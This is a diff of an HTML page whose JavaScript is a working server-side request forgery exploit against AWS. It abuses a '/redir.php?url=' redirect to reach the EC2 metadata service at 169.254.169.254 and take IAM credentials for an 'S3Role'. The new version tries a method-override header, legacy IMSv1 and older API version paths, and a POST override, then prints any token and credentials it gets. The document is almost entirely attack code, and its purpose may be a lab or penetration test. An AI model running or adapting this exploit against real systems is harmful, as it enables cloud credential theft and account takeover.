@@ -1,85 +1,108 @@
 <html>
     <head>
-        <title>AWS IMSv2 - Origin Fixed</title>
+        <title>AWS Method Override & IMSv1</title>
     </head>
     <body>
-        <h1>AWS IMSv2 Exploitation</h1>
-        <div id="status">Initializing...</div>
+        <h1>AWS Exploitation - Method Override & IMSv1</h1>
+        <div id="status">Starting alternative methods...</div>
         <div id="results"></div>
         
         <script>
             var status = document.getElementById("status");
             var results = document.getElementById("results");
             
-            status.innerHTML = "Starting AWS IMSv2 exploitation...";
+            status.innerHTML = "Testing method override and IMSv1 approaches...";
             
-            // Function to make requests using the current page's origin
-            function makeAWSRequest() {
-                var baseUrl = window.location.protocol + "//" + window.location.host;
+            // Method 1: Try HTTP Method Override Headers
+            status.innerHTML += "<br>Method 1: HTTP Method Override...";
+            try {
+                var xhr1 = new XMLHttpRequest();
+                xhr1.open('GET', '/redir.php?url=http://169.254.169.254/latest/api/token', false);
+                xhr1.setRequestHeader('X-HTTP-Method-Override', 'PUT');
+                xhr1.setRequestHeader('X-aws-ec2-metadata-token-ttl-seconds', '21600');
+                xhr1.send();
                 
-                status.innerHTML += "<br>Base URL: " + baseUrl;
-                status.innerHTML += "<br>Attempting token request...";
+                if (xhr1.responseText && xhr1.responseText.length > 10) {
+                    results.innerHTML += "<h3>Method Override Success - Token:</h3><pre>" + xhr1.responseText + "</pre>";
+                    
+                    // Try to use the token
+                    var xhr2 = new XMLHttpRequest();
+                    xhr2.open('GET', '/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/S3Role', false);
+                    xhr2.setRequestHeader('X-aws-ec2-metadata-token', xhr1.responseText);
+                    xhr2.send();
+                    results.innerHTML += "<h3>Credentials with Override Token:</h3><pre>" + xhr2.responseText + "</pre>";
+                } else {
+                    results.innerHTML += "<p>Method 1 failed: " + xhr1.status + " - " + xhr1.responseText + "</p>";
+                }
+            } catch(e) {
+                results.innerHTML += "<p>Method 1 error: " + e.message + "</p>";
+            }
+            
+            // Method 2: Try IMSv1 (No token required)
+            status.innerHTML += "<br>Method 2: IMSv1 (Legacy API)...";
+            try {
+                var xhr3 = new XMLHttpRequest();
+                xhr3.open('GET', '/redir.php?url=http://169.254.169.254/1.0/meta-data/iam/security-credentials/', false);
+                xhr3.send();
                 
+                if (xhr3.responseText && xhr3.responseText.indexOf('S3Role') !== -1) {
+                    results.innerHTML += "<h3>IMSv1 Role Found:</h3><pre>" + xhr3.responseText + "</pre>";
+                    
+                    // Get the actual credentials
+                    var xhr4 = new XMLHttpRequest();
+                    xhr4.open('GET', '/redir.php?url=http://169.254.169.254/1.0/meta-data/iam/security-credentials/S3Role', false);
+                    xhr4.send();
+                    results.innerHTML += "<h3>IMSv1 Credentials:</h3><pre style='word-wrap: break-word; white-space: pre-wrap;'>" + xhr4.responseText + "</pre>";
+                    status.innerHTML += "<br>SUCCESS with IMSv1!";
+                } else {
+                    results.innerHTML += "<p>IMSv1 failed: " + xhr3.status + " - " + xhr3.responseText + "</p>";
+                }
+            } catch(e) {
+                results.innerHTML += "<p>Method 2 error: " + e.message + "</p>";
+            }
+            
+            // Method 3: Try other legacy API versions
+            status.innerHTML += "<br>Method 3: Other legacy versions...";
+            var versions = ['2007-01-19', '2008-02-01', '2009-04-04', '2016-09-02'];
+            
+            for (var i = 0; i < versions.length; i++) {
                 try {
-                    // Step 1: Get token with PUT request
-                    var tokenXhr = new XMLHttpRequest();
-                    var tokenUrl = baseUrl + "/redir.php?url=http://169.254.169.254/latest/api/token";
+                    var xhr5 = new XMLHttpRequest();
+                    xhr5.open('GET', '/redir.php?url=http://169.254.169.254/' + versions[i] + '/meta-data/iam/security-credentials/', false);
+                    xhr5.send();
                     
-                    tokenXhr.open('PUT', tokenUrl, false);
-                    tokenXhr.setRequestHeader('X-aws-ec2-metadata-token-ttl-seconds', '21600');
-                    tokenXhr.send();
-                    
-                    if (tokenXhr.status === 200 || tokenXhr.status === 0) {
-                        var token = tokenXhr.responseText;
-                        results.innerHTML += "<h3>Token Success:</h3><pre>" + token + "</pre>";
+                    if (xhr5.responseText && xhr5.responseText.length > 10) {
+                        results.innerHTML += "<h3>Version " + versions[i] + ":</h3><pre>" + xhr5.responseText + "</pre>";
                         
-                        // Step 2: Get credentials with token
-                        var credXhr = new XMLHttpRequest();
-                        var credUrl = baseUrl + "/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/S3Role";
-                        
-                        credXhr.open('GET', credUrl, false);
-                        credXhr.setRequestHeader('X-aws-ec2-metadata-token', token);
-                        credXhr.send();
-                        
-                        if (credXhr.status === 200 || credXhr.status === 0) {
-                            results.innerHTML += "<h3>AWS Credentials:</h3><pre style='word-wrap: break-word; white-space: pre-wrap;'>" + credXhr.responseText + "</pre>";
-                            status.innerHTML += "<br>SUCCESS! AWS credentials retrieved!";
-                        } else {
-                            results.innerHTML += "<h3>Credentials Error:</h3><pre>Status: " + credXhr.status + "<br>" + credXhr.responseText + "</pre>";
+                        // If we found a role, try to get credentials
+                        if (xhr5.responseText.indexOf('S3Role') !== -1) {
+                            var xhr6 = new XMLHttpRequest();
+                            xhr6.open('GET', '/redir.php?url=http://169.254.169.254/' + versions[i] + '/meta-data/iam/security-credentials/S3Role', false);
+                            xhr6.send();
+                            results.innerHTML += "<h3>Credentials from " + versions[i] + ":</h3><pre style='word-wrap: break-word;'>" + xhr6.responseText + "</pre>";
                         }
-                        
-                    } else {
-                        results.innerHTML += "<h3>Token Error:</h3><pre>Status: " + tokenXhr.status + "<br>" + tokenXhr.responseText + "</pre>";
-                        
-                        // Fallback: Try without token (IMSv1)
-                        status.innerHTML += "<br>Trying fallback methods...";
-                        tryFallbackMethods(baseUrl);
                     }
-                    
                 } catch(e) {
-                    results.innerHTML += "<h3>JavaScript Error:</h3><pre>" + e.message + "</pre>";
-                    status.innerHTML += "<br>Error occurred, trying alternative methods...";
-                    tryFallbackMethods(baseUrl);
+                    // Continue to next version
                 }
             }
             
-            function tryFallbackMethods(baseUrl) {
-                // Try IMSv1 (no token required)
-                try {
-                    var fallbackXhr = new XMLHttpRequest();
-                    fallbackXhr.open('GET', baseUrl + "/redir.php?url=http://169.254.169.254/1.0/meta-data/iam/security-credentials/", false);
-                    fallbackXhr.send();
-                    results.innerHTML += "<h3>IMSv1 Fallback:</h3><pre>" + fallbackXhr.responseText + "</pre>";
-                } catch(e) {
-                    results.innerHTML += "<h3>Fallback Error:</h3><pre>" + e.message + "</pre>";
+            // Method 4: Try POST method override
+            status.innerHTML += "<br>Method 4: POST method override...";
+            try {
+                var xhr7 = new XMLHttpRequest();
+                xhr7.open('POST', '/redir.php', false);
+                xhr7.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                xhr7.send('url=http://169.254.169.254/latest/api/token&_method=PUT&X-aws-ec2-metadata-token-ttl-seconds=21600');
+                
+                if (xhr7.responseText && xhr7.responseText.length > 10) {
+                    results.innerHTML += "<h3>POST Override Token:</h3><pre>" + xhr7.responseText + "</pre>";
                 }
+            } catch(e) {
+                results.innerHTML += "<p>Method 4 error: " + e.message + "</p>";
             }
             
-            // Check current environment and start
-            status.innerHTML += "<br>Current URL: " + window.location.href;
-            status.innerHTML += "<br>Starting in 2 seconds...";
-            
-            setTimeout(makeAWSRequest, 2000);
+            status.innerHTML += "<br>All methods completed.";
         </script>
     </body>
 </html>
